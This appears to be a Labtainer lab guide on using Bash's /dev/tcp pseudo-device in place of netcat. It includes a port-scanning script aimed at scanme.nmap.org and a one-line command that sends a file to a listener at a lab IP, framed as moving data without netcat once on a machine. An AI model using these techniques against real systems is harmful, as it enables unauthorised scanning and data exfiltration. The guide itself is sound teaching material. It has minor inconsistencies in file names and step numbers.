![](media/b80e0eacca6dad9d42b5dc3545946591.png)

DEV/TCP Connect Demo
=====

Netcat is a utility that is generally used to read of write information from network connections. Because of the many ways that this utility can be exploited by adversaries, it is highly recommend that it be removed from production servers. That being said, given access to a machine, even without netcat installed, you can use the principles upon
which it operates to transfer information, interact with application or port scan (just like you can do with netcat!)


*Follow the below steps*

Custom Port Scanner with /dev/tcp
====

When executing a command on a /dev/tcp/$host/$port pseudo-device file, Bash opens a TCP connection to the associated socket.

1) Start Labtainer "nmap-ssh". Log into the analyst container.

2) Create the following bash script on the machine to scan ports 20 thru 80 (you can do more/different ports but for our environment, this saves time) and saves the results to a file in your home directory:

```

#!/bin/bash
for P in {20..81} #port range
do
  echo "HEAD / HTTP 1.0" > /dev/tcp/scanme.nmap.org/$P #target to scan
  MYEXIT=$?
  if [ "X$MYEXIT" = "X0" ]; then
    echo "$P ' is open'" >> /home/student/Desktop/scanresults.txt #file holding resutls
  else
    echo "Connection unsuccessful. Exit code: $MYEXIT"
  fi
done

```

3) Simply run the script and check the file called "scan.txt" created in your home directory. This shows the ports that were open when scanned.

You've found and open port!: File Transfer with /dev/tcp
=====
 
1) Start Labtainer "nmap-ssh".

2) You will establish a listening port (assume this was a port you "discovered" during recon) on the analyst container. You will use this open port to receive the contents of the "payload" (it's just a file with a message in it) you created on the router container. This will be sent over a socket. Use the command: 

```
nc -l -p 1111 > innocentfile.txt

```
*The file name can be whatever you choose.

4) Now go to the router container and create a "payload" file that you will send to the analyst. Make sure to write a message you will recognize into the file.

```
touch mypayload.txt
echo "test message" > mypayload.txt
```

5) Now you will send the "payload" to the open port you found. Use the command: 

```
cat mypayload.txt > /dev/tcp/172.25.0.2/1111
```
to send the file from the router to the analyst

5) You can go back to the analyst container now and check the contents of the file that you connected to the listener, it should display the "payload" file contents you sent from the router.

